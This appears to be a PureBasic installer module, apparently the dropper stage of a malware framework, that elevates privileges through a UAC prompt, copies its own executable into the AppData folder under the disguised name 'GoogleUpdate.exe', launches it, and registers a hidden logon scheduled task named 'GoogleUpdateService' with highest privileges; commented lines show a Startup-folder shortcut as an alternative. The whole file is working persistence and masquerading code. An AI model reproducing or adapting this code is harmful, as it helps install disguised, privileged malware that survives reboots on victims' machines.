
#MODULE_ACCESS = 0

XIncludeFile("../include/framework.pbi")


Global PATH1$ = GetHomeDirectory()+"GoogleUpdate.exe"


Procedure.i RelaunchAndElevate(params$="")
   Protected info.SHELLEXECUTEINFO,exe$
   exe$=ProgramFilename()
   args.s = "/c start "+exe$+" "+Chr(34)+params$+Chr(34)+" && exit"
   If exe$
      info\hwnd            = GetForegroundWindow_()
      info\cbSize          = SizeOf(SHELLEXECUTEINFO)
      info\lpVerb          = @"runas"
      info\lpFile          = @"cmd.exe"
      info\lpParameters    = @args
      info\nShow           = #SW_SHOWNORMAL
      ProcedureReturn ShellExecuteEx_(info)
 EndIf
EndProcedure

Procedure.i RelaunchAndElevate1(params$="")
   Protected info.SHELLEXECUTEINFO,exe$
   exe$=ProgramFilename()
   If exe$
      info\hwnd            = GetForegroundWindow_()
      info\cbSize          = SizeOf(SHELLEXECUTEINFO)
      info\lpVerb          = @"runas"
      info\lpFile          = @exe$
      info\lpParameters    = @params$
      info\nShow           = #SW_SHOWNORMAL
      ProcedureReturn ShellExecuteEx_(info)
 EndIf
EndProcedure


Prototype.l CheckTokenMembership_(TokenHandle.i,SidToCheck.i,*IsMember)
Prototype.l AllocateAndInitializeSid_(*pIdentifierAuthority,nSubAuthorityCount.b,dwSubAuthority0.l,dwSubAuthority1.l,dwSubAuthority2.l,dwSubAuthority3.l,dwSubAuthority4.l,dwSubAuthority5.l,dwSubAuthority6.l,dwSubAuthority7.l,*pSid)
Prototype.i FreeSid_(*pSid)

;Returns #True if this program/process is a member of the Administrators local group, or #False otherwise or if failure.
;Works on Windows 5.x (2000, XP, 2003, etc.) and 6.x (vista, 2008, Win7, etc.)
Procedure.i IsUserAdmin()
   Protected result.i=#True,dll.i
   Protected CheckTokenMembership_.CheckTokenMembership_,AllocateAndInitializeSid_.AllocateAndInitializeSid_,FreeSid_.FreeSid_
   Protected *AdministratorsGroup.SID_IDENTIFIER_AUTHORITY,NtAuthority.SID_IDENTIFIER_AUTHORITY

   dll=OpenLibrary(#PB_Any,"advapi32.dll")
   If dll
      CheckTokenMembership_=GetFunction(dll,"CheckTokenMembership")
      AllocateAndInitializeSid_=GetFunction(dll,"AllocateAndInitializeSid")
      FreeSid_=GetFunction(dll,"FreeSid")
      If Not (CheckTokenMembership_ Or AllocateAndInitializeSid_ Or FreeSid_)
         result=#False
      EndIf
      If result
         ;NtAuthority=SECURITY_NT_AUTHORITY [0,0,0,0,0,5]
         NtAuthority\Value[0]=0
         NtAuthority\Value[1]=0
         NtAuthority\Value[2]=0
         NtAuthority\Value[3]=0
         NtAuthority\Value[4]=0
         NtAuthority\Value[5]=5
         result=AllocateAndInitializeSid_(NtAuthority,2,#SECURITY_BUILTIN_DOMAIN_RID,#DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,@*AdministratorsGroup)
         If result And *AdministratorsGroup
            If Not CheckTokenMembership_(#Null,*AdministratorsGroup,@result)
               result=#False
            EndIf
            FreeSid_(*AdministratorsGroup)
         EndIf
      EndIf
      CloseLibrary(dll)
   Else
    result=#False
   EndIf
   ProcedureReturn result
EndProcedure

Macro DEFINE_GUID(Name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8)
CompilerIf Defined(Name, #PB_Variable)
   If SizeOf(Name) = SizeOf(GUID)
      Name\Data1 = l
      Name\Data2 = w1
      Name\Data3 = w2
      Name\Data4[0] = b1
      Name\Data4[1] = b2
      Name\Data4[2] = b3
      Name\Data4[3] = b4
      Name\Data4[4] = b5
      Name\Data4[5] = b6
      Name\Data4[6] = b7
      Name\Data4[7] = b8
   EndIf
CompilerEndIf
EndMacro

Procedure ShortcutCreate(Path.s, Link.s, WorkingDir.s="", Argument.s="", ShowCommand=#SW_SHOWNORMAL, Description.s="", HotKey=#Null, IconFile.s="|", IconIndex=0)
; Path: "C:\PureBasic\purebasic.exe"
; Link: "C:\Documents and Settings\User\Desktop\PureBasic.lnk"
; WorkingDir: "C:\PureBasic\"
; Argument: "%1"
; ShowCommand: #SW_SHOWNORMAL, #SW_SHOWMAXIMIZED or #SW_SHOWMINIMIZED
; Description: "Start PureBasic"
; HotKey: Shortcut of keys for the link
; IconFile: "C:\PureBasic\purebasic.exe"
; IconIndex: 0
   Protected CLSID_ShellLink.GUID, IID_IShellLink.GUID, IID_IPersistFile.GUID
CompilerIf #PB_Compiler_Unicode
   Protected psl.IShellLinkW
CompilerElse
   Protected psl.IShellLinkA
CompilerEndIf
   Protected ppf.IPersistFile
   Protected Result = #False

   DEFINE_GUID(CLSID_ShellLink, $00021401, $0000, $0000, $C0, $00, $00, $00, $00, $00, $00, $46)
CompilerIf #PB_Compiler_Unicode
   DEFINE_GUID(IID_IShellLink, $000214F9, $0000, $0000, $C0, $00, $00, $00, $00, $00, $00, $46)
CompilerElse
   DEFINE_GUID(IID_IShellLink, $000214EE, $0000, $0000, $C0, $00, $00, $00, $00, $00, $00, $46)
CompilerEndIf
   DEFINE_GUID(IID_IPersistFile, $0000010B, $0000, $0000, $C0, $00, $00, $00, $00, $00, $00, $46)

   If Len(WorkingDir) = 0 : WorkingDir = GetPathPart(Path) : EndIf

   If IconFile = "|" : IconFile = Path : EndIf


   CoInitialize_(0)
   If CoCreateInstance_(@CLSID_ShellLink, 0, 1, @IID_IShellLink, @psl) =  #S_OK
      With psl
         \SetPath(Path)
         \SetArguments(Argument)
         \SetWorkingDirectory(WorkingDir)
         \SetDescription(Description)
         \SetShowCmd(ShowCommand)
         \SetHotkey(HotKey)
         \SetIconLocation(IconFile, IconIndex)
      EndWith

      If psl\QueryInterface(@IID_IPersistFile, @ppf) = #S_OK
         If ppf\Save(Link, #True) = #S_OK
            Result = #True
         EndIf
         ppf\Release()
      EndIf
      psl\Release()
   EndIf
   CoUninitialize_()

   ProcedureReturn Result
EndProcedure


Procedure.s GetSpecialFolderLocation(Value.l)
  Protected Folder_ID,SpecialFolderLocation.s
 
  If SHGetSpecialFolderLocation_(0, Value, @Folder_ID) = 0
    SpecialFolderLocation = Space(#MAX_PATH*2)
    SHGetPathFromIDList_(Folder_ID, @SpecialFolderLocation)
    If SpecialFolderLocation
      If Right(SpecialFolderLocation, 1) <> "\"
        SpecialFolderLocation + "\"
      EndIf
    EndIf
    CoTaskMemFree_(Folder_ID)
  EndIf
   ProcedureReturn SpecialFolderLocation.s
EndProcedure

#CSIDL_STARTUP = $7
#CSIDL_APPDATA = $1A

If Not IsUserAdmin();
	If RelaunchAndElevate(com(0))
  		End
  	Else
  	;;Not elevated
 EndIf
Else
;elevated
EndIf
PATH1$ = GetSpecialFolderLocation(#CSIDL_APPDATA) + "GoogleUpdate.exe"

DeleteFile(PATH1$)
CopyFile(com(0),PATH1$)
Delay(1000)
RunProgram(PATH1$)

;ShortcutCreate(PATH1$,GetSpecialFolderLocation(#CSIDL_STARTUP) + "GoogleUpdate.lnk")
;command$ = "schtasks /create /tn "+Chr(34)+"TASK"+Chr(34)+" /sc onlogon  /tr "+Chr(34)+"C:\Windows\System32\calc.exe"+Chr(34)+" /it"


RunProgram("schtasks","/create /tn "+Chr(34)+"GoogleUpdateService"+Chr(34)+" /sc onlogon  /tr "+Chr(34)+PATH1$+Chr(34)+" /it /RL HIGHEST", "",#PB_Program_Hide)

; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableUser
; Executable = install.exe
; EnableCompileCount = 48
; EnableBuildCount = 41